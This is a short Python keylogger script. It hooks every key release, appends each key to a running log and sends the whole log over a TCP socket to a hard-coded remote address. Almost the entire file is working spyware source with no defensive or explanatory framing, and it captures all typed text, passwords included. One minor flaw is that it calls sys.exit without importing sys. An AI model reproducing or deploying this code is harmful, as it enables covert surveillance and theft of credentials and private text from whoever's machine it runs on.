# Modules
import socket,time,keyboard

# Variables
HOST = "192.168.0.92"
PORT = 80

# Connect to server and send keystrokes
class Logger():
  def __init__(self):
    self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.s.connect((HOST,PORT))
    self.log = ""

  #Listen for keystrokes
  def listen(self,e):
    key = e.name
    #Adding exceptions such as enter and tab
    if key == "enter":
      key = "\n"
    elif key == "space":
      key = " "
    #Logging and sending to server
    self.log += key
    self.s.send(self.log.encode())

  # Start listening
  def start(self):
    try:
      keyboard.on_release(callback=self.listen)
      keyboard.wait()
    except KeyboardInterrupt:
      print("Exiting...")
      sys.exit()

if __name__ == "__main__":
  logger = Logger()
  while True:
    logger.start()